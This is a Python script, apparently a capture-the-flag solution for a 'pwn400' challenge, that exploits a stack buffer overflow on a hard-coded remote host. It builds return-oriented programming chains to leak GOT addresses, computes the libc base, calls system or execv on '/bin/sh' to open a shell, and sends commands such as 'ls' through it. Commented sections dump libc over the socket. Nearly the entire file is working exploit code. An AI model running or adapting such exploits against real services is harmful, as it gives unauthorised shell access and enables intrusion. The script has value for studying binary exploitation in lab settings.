__author__ = 'HuyNA'
import sys
import os
import socket
import time
import struct
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Exploit 23.23.190.205:8976 to get the flag.
host = "23.23.190.205"
local_host="192.168.248.154"
port = 8976

s.connect((host, port))
data = s.recv(len("Good Enough? Pwn Me!\n"))
print(data)
max_count = 2048

new_buffer = struct.pack("<I", 0x08049A00)
write_address_string = struct.pack("<I", 0x08048440)
read_address_string = struct.pack("<I", 0x080483D0)
pop_pop_pop_ret_address_string = 0x080486A7
# 08049A01
overwrite_address = 0x080499FC

delta_read_function = 0x0
base_libc = 0xB7610000
base_libc_string = struct.pack("<I", base_libc)

std_out = struct.pack("<I", 0x01)
std_in = struct.pack("<I", 0x00)
#data1 = "a"*(0x6c-0x28) + "c"*4 + "b"*0x1C + return_value_2 + std_out + dump_memory_address + size + new_buffer*0x6c + new_buffer + "\n"

def write_rop(return_address, mem_address, size):
    global read_address_string, std_out
    mem_address_string = struct.pack("<I", mem_address)
    size_string = struct.pack("<I", size)
    return_address_string = struct.pack("<I", return_address)
    rop = write_address_string + return_address_string + std_out + mem_address_string + size_string
    return rop

def read_rop(return_address, mem_address, size):
    global read_address_string, std_in
    mem_address_string = struct.pack("<I", mem_address)
    size_string = struct.pack("<I", size)
    return_address_string = struct.pack("<I", return_address)
    rop = read_address_string + return_address_string + std_in + mem_address_string + size_string
    return rop
def pack_integer(a):
    return struct.pack("<I", a)
def recv_libc(s):
    libc_file = open("libc_pwn400.dump", "wb")
    data = s.recv(0x1000)
    print(data)
    libc_buffer = data
    i=0
    s.settimeout(20)
    try:
        while(len(data) >= 1):
            data = s.recv(0x1000)
            libc_buffer += data
            time.sleep(0.01)
            print(i)
            i += 1
    finally:
        libc_file.write(libc_buffer)

def build_execv_rop(base_lib):
    poppopret = 0x080486A8
    delta_dup2 = 0x0
    delta_execv = 0x000B9230
    delta_bin_sh_string = 0x00161D98
    dup2_address = delta_dup2 + base_lib
    execv_address = delta_execv + base_lib
    bin_sh_string_address = delta_bin_sh_string + base_lib

    rop = 	struct.pack("<I", execv_address)	# execv("/bin/sh", NULL)
    rop += 	struct.pack("<I", 0x08048641)
    rop +=  struct.pack("<I", bin_sh_string_address)
    rop += 	struct.pack("<I", 0x00000000)
    return rop


#data1 = "a"*(0x6c-0x28) + "c"*4 + "b"*0x1C + read_rop(0x08048587, overwrite_address, 4) + new_buffer*0x6c + new_buffer + "\n"
got_table_memory_address = 0x080499C4 # neu ko dc thi thay = 080499C4
size = 0x100
data2 = "a"*(0x6c-0x28) + "c"*4 + "b"*0x1C + \
        write_rop(pop_pop_pop_ret_address_string, got_table_memory_address, size) + \
        read_rop(pop_pop_pop_ret_address_string, 0x08049A00, 0x100) + \
        write_rop(pop_pop_pop_ret_address_string, 0x08049A00, 0x100) + \
        pack_integer(0x080486A9) + \
        pack_integer(0x08049A00+0x0C) + \
        pack_integer(0x080486A3) + \
        new_buffer*0x6c + new_buffer + "\n"

data1 = "a"*(0x6c-0x28) + "c"*4 + "b"*0x1C + \
        write_rop(pop_pop_pop_ret_address_string, got_table_memory_address, size) + \
        read_rop(pop_pop_pop_ret_address_string, 0x08049A00, 0x100) + \
        write_rop(pop_pop_pop_ret_address_string, 0x08049A00, 0x100) + \
        new_buffer*0x6c + new_buffer + "\n"

s.send(data2)
time.sleep(0.1)

data = s.recv(0x100)
print(data.encode("hex"))

read_function_address_string = data[4:8]

read_function_address = struct.unpack("<I", read_function_address_string)[0]

fake_base_libc_address = read_function_address - 0xDF820 + 0x610
print(hex(fake_base_libc_address))
size_libc = 0x002AD000

system_function_delta = 0x0003F430

system_function_address = system_function_delta + fake_base_libc_address

rop1 = struct.pack("<I", system_function_address)	# execv("/bin/sh", NULL)
#rop1 += struct.pack("<I", 0x08048641) # print Good Enough? Pwn Me!
#0804857F
rop1 += struct.pack("<I", 0x0804857F)   # open ./flag
rop1 += struct.pack("<I", 0x08049A00)

rop = pack_integer(0x0020736c)*4        # "ls \x00"
rop += build_execv_rop(fake_base_libc_address)

print(rop)
s.send(rop)
time.sleep(0.1)
print(s.recv(0x100))
time.sleep(5)

s.send("ls\x00\n")
print("sended command")
time.sleep(5)
print(s.recv(1024))
print(s.recv(1024))
print(s.recv(1024))
print(s.recv(1024))
print("11")
print(s.recv(1024))


"""
libc_file = open("libc_pwn400.dump", "wb")
data = s.recv(0x1000)
print(data)
libc_buffer = data
i=0
s.settimeout(20)
try:
    while(len(data) >= 1):
        data = s.recv(0x1000)
        libc_buffer += data
        time.sleep(0.01)
        print(i)
        i += 1
finally:
    libc_file.write(libc_buffer)
"""
"""
    ec98040818997fb7a0c67eb7c02f6eb7108270b7902b6eb7802d6ab70684040816840408207d70b7e02364b7908270b7908170b70000000000000000808704089b870408b187040800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    ec980408183974b7a06673b7c0cf62b7102265b790cb62b780cd5eb70684040816840408201d65b7e0c358b7902265b7902165b70000000000000000808704089b870408b187040800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
"""